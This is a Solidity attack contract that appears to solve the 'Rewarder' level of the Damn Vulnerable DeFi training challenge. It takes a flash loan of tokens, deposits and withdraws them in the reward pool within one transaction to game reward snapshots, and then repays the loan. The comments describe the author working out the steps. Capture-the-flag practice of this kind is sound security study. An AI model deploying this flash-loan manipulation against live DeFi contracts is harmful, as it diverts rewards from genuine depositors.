// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken/DamnValuableToken.sol";

// Needs to implement "receiveFlashLoan(uint256)", and call the flashloan
// Also needs to call `deposit()` on TheRewarderPool, then call withdraw, and pay back the loan
// At least, that seems like the sequence.

// Oof, forgot the approve line, had to do some spelunking to realize I had forgotten to include it

contract Level05Attack {

    DamnValuableToken dvt = DamnValuableToken(0x2aC875AB4C170C859052805725a1Fc0b6Aed092F);
    address rewardPool = 0x1CE6a2Cd2A0a25dB38AEb84A06a2F83EB6cfA611;
    address flashPool = 0x05EAc33FC744D1d08B0443A88BC2723266A43E91;

    function takeLoan(uint256 _amount) external {
        dvt.approve(rewardPool, 1000000000000000000000000);
        flashPool.call(abi.encodeWithSignature("flashLoan(uint256)", _amount));
        
    }

    function receiveFlashLoan(uint256 _amount) external {
        rewardPool.call(abi.encodeWithSignature("deposit(uint256)", _amount));
        rewardPool.call(abi.encodeWithSignature("withdraw(uint256)", _amount));
        dvt.transfer(flashPool, _amount);
    }
}
